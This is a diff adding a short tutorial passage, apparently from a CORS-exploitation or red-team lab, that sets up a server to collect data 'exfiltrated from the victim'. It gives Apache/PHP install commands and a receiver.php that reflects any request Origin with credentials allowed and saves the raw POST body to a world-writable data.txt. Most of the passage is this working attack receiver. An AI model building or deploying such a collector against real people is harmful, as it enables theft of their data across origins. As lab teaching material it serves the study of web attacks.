@@ -1,0 +1,22 @@
+If you're using your machine, install Apache and PHP by using the command sudo apt install php apache2. Once done, go to /var/www/html/ directory to verify if it's installed properly.
+We will be using PHP to capture the exfiltrated data from the victim. Below is the content of receiver.php. The script below captures the data from php://input and then saves the data in a text file. Save the below script as receiver.php and save it to /var/www/html/.
+
+sudo systemctl enable apache2
+sudo systemctl start apache2
+
+<?php
+header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
+header('Access-Control-Allow-Credentials: true');
+
+$postdata = file_get_contents("php://input");
+
+file_put_contents('data.txt', $postdata);
+?>
+
+To make sure that the data.txt file is writable, follow the series of commands below:
+touch data.txt
+ls
+chmod 0777 data.txt
+ls -lah
+
+stop it when youre done :)
